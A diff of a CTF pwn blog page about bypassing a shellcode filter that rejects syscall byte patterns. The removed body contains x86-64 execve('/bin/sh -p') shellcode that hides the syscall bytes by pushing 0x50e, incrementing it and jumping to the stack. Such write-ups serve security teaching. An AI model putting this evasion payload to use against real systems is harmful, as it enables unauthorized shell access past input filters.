@@ -24,7 +24,7 @@
 <meta property="og:description" content="shellcode检查机制">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-11-07T14:57:00.000Z">
-<meta property="article:modified_time" content="2023-12-04T06:43:43.384Z">
+<meta property="article:modified_time" content="2024-04-10T03:46:40.913Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta property="article:tag" content="stack">
@@ -236,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          880 words
+          1 words
         
       </span>
     
@@ -247,7 +247,7 @@
         
         
         
-          8 mins
+          1 mins
         
       </span>
     
@@ -290,7 +290,7 @@
             
               <div class="markdown-body">
                 
-                <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//检查不许出现syscall的字节： </span><br><span class="hljs-keyword">if</span> ( *v11 == <span class="hljs-number">0x80CD</span> || *v11 == <span class="hljs-number">0x340F</span> || *v11 == <span class="hljs-number">0x50F</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed filter at byte %d!\n&quot;</span>, l);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>把push <span class="hljs-number">0x50f</span>改成 push <span class="hljs-number">0x50e</span> ; inc qword ptr [rsp] <br>shellcode =  \<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0) */</span><br>    <span class="hljs-comment">/* push b&#x27;/bin///sh\x00&#x27; */</span><br>    push <span class="hljs-number">0x68</span><br>    mov rax, <span class="hljs-number">0x732f2f2f6e69622f</span><br>    push rax<br>    mov rdi, rsp<br>    <span class="hljs-comment">/* push argument array [&#x27;sh\x00&#x27;, &#x27;-p\x00&#x27;] */</span><br>    <span class="hljs-comment">/* push b&#x27;sh\x00-p\x00&#x27; */</span><br>    mov rax, <span class="hljs-number">0x101010101010101</span><br>    push rax<br>    mov rax, <span class="hljs-number">0x101010101010101</span> ^ <span class="hljs-number">0x702d006873</span><br>    xor [rsp], rax<br>    xor esi, esi <span class="hljs-comment">/* 0 */</span><br>    push rsi <span class="hljs-comment">/* null terminate */</span><br>    push <span class="hljs-number">0xb</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;-p\x00&#x27; */</span><br>    push <span class="hljs-number">0x10</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;sh\x00&#x27; */</span><br>    mov rsi, rsp<br>    xor edx, edx <span class="hljs-comment">/* 0 */</span><br>    <span class="hljs-comment">/* call execve() */</span><br>    push <span class="hljs-number">0x3b</span> <span class="hljs-comment">/* 0x3b */</span><br>    pop rax<br>    <span class="hljs-comment">//syscall</span><br>    push <span class="hljs-number">0x050e</span><br>    inc qword ptr [rsp]<br>    jmp rsp<br>    nop<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+                <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure>
 
 
                 
